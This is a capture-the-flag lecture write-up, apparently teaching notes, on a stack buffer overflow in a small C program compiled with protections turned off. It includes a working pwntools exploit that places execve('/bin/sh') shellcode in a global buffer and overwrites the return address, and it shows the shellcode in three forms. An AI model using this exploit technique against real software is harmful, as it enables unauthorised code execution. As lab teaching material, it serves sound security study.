# Simple Buffer Overflow - 0x04
###### tags: `CTF` `PWN`

## Original Code
```clike!
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char message[48];

int main()
{
    char name[16];
    printf("Give me your message: ");
    fflush(stdout);
    read(0, message, 0x30);
    fflush(stdout);
    read(0, name, 0x30);
    return 0;
}
```
* Actually, this is a variant of the [lecture 0x01](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs)
* <font color="F0000">Note that</font>, the global variable has its own address, instead of local variable that push to stack that we don't know at first.
* The 1st `read` function has no overflow, but 2nd `read` function has.

* Note that, if you establish the code yourself, you must turn off the protection by the command below and use `checksec` to observe the protection
    ```bash!
    gcc -o bof3 bof3.c -zexecstack -no-pie -fno-stack-protector -z norelro
    ```
* <font color="FF0000">Note that</font>:
must use `mprotect` to change permission access just like [lecture 0x04](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci), add these line in original code
    ```c!
    #include <sys/mman.h>
    mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
    ```
    **Before `mprotect` - `vmmap`**
    ![](https://imgur.com/yQ8PeWN.png)
    **After `mprotect` - `vmmap`**
    ![](https://imgur.com/moSdC0R.png)

## Exploit
* The main idea of this problem is write down your shellcode in `message` global variable and use `BOF` of 2nd `read` function to overlap `%rip`
* First, observe the address of global variable - `message` → `4033c0`
![](https://imgur.com/dTVBnkK.png)
* So, we have to construct our shellcode in [lecture 0x02](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/BJRfEWFcs)
    ```python!
    from pwn import *

    r = process('./bof3')
    raw_input()

    # First, we must set our infrastructure of the platform
    context.arch = 'amd64'  # x86-64 → amd64, x86-32 → i386

    # asm function transfer your shellcode to machine language
    shellcode = asm('''
    mov    rbx, 0x68732f6e69622f
    push   rbx
    mov    rdi, rsp
    xor    rsi, rsi
    xor    rdx, rdx
    mov    rax, 0x3b
    syscall
    ''')

    r.send(shellcode)   # Send to 1st read function

    payload = b'a' * 0x18 + p64(0x4033c0)

    r.send(payload) # Send to 2nd read function that has bof
    r.interactive()
    ```

    * Note that, the 3 methods below are equal
        
        ```python!
        shellcode = asm('''
        mov    rbx, 0x68732f6e69622f
        push   rbx
        mov    rdi, rsp
        xor    rsi, rsi
        xor    rdx, rdx
        mov    rax, 0x3b
        syscall
        ''')
        ```
        
        * Made by [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm#disassembly)
        ```python!
        shellcode = asm('\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05')
        ```
            
        * Made by `pwntools` built-in function
        ```python!
        shellcode = asm(shellcraft.sh())
        ```
* Then we got shell!!!
    ![](https://imgur.com/fQ9X9e6.png)